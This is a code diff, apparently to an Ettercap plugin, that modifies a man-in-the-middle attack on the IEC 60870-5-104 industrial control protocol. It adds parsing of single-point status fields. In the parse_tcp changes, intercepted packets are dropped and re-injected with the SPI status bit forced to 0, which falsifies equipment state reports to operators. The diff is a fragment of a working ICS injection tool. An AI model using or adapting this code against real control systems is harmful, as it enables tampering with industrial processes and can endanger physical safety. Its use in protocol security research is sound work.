@@ -66,8 +66,15 @@ struct asdu_header {
   #else 
     u_char originator_addr;
   #endif
-  u_int IOA : 24;
-  u_long value;
+  u_int IOA : 16; //8, 16 or 24
+  u_char spacer;
+  // Specifically for a SIQ information element
+  u_char spi : 1;
+  u_char blank : 3;
+  u_char bl : 1;
+  u_char sb : 1;
+  u_char nt : 1;
+  u_char iv : 1;
 };
 
 /* prototypes is required for -Wmissing-prototypes */
@@ -182,14 +189,17 @@ static void parse_tcp(struct packet_object *po)
 
     /* we can't inject in unoffensive mode or in bridge mode */
     if (GBL_OPTIONS->unoffensive || GBL_OPTIONS->read || GBL_OPTIONS->iface_bridge) {
+    // if ( GBL_OPTIONS->unoffensive) {
+      USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
       return -EINVALID;
-    }
+    } 
 
     /* Prevent the packet being sent */
     po->flags ^= PO_DROPPED;
 
     /* Modify the value */
-    asdu->COT = 0x05;
+    // asdu->COT = 0x2A;
+    asdu->spi = 0;
     memcpy(po->DATA.data, apci, sizeof(apci));
     memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));
 
@@ -231,8 +241,10 @@ static void print_apci(struct apci_header *apci)
 
 static void print_asdu(struct asdu_header *asdu)
 {
-  USER_MSG("\n[-] ASDU\n[+] TC:\t\t 0x%x <%d> \n[+] SQ:\t\t %x \n[+] COT:\t %d \n[+] PN:\t\t %x \n[+] T:\t\t %x \n[+] O-Addr:\t %d \n[+] IOA:\t %d \n[+] Value:\t %d \n", 
-    asdu->type_id, asdu->type_id, asdu->sq, asdu->COT, asdu->PN, asdu->T, asdu->originator_addr, asdu->IOA, asdu->value);
+  USER_MSG("\n[-] ASDU\n[+] TC:\t\t 0x%x <%d> \n[+] SQ:\t\t %x \n[+] COT:\t %d \n[+] PN:\t\t %x \n[+] T:\t\t %x \n[+] O-Addr:\t %d \n[+] IOA:\t %d \n", 
+    asdu->type_id, asdu->type_id, asdu->sq, asdu->COT, asdu->PN, asdu->T, asdu->originator_addr, asdu->IOA);
+  USER_MSG("\n[*] SPI: %d - BL: %d - SB: %d - NT: %d - IV: %d\n",
+    asdu->spi, asdu->bl, asdu->sb, asdu->nt, asdu->iv);
 }
 
 /* EOF */
